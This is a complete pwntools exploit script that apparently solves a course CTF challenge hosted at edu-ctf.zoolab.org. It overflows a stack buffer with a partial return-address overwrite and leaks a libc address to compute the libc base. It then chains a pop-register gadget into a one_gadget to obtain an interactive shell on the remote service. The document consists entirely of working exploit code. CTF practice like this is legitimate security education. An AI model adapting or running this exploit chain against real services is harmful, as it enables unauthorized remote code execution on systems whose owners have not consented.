#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#r = process('./test', aslr=False)
r = remote('edu-ctf.zoolab.org', 10014)

payload = b'A'*0x18 + b'\x7c'
r.send(payload)
r.recvuntil(b'A'*0x18)
libc = u64(r.recv(8)) - 0x2407c
oneshot = libc + 0xe3afe
rop_pop_r12_r13_r14_ret = libc + 0x2601a
info(f"libc: {hex(libc)}")

payload = b'A'*0x18 + p64(rop_pop_r12_r13_r14_ret) + p64(0)
r.send(payload)
r.recvuntil(b'A'*0x18)

payload = b'A'*0x18 + p64(oneshot)
r.send(payload)
r.recvuntil(b'A'*0x18)

r.interactive()
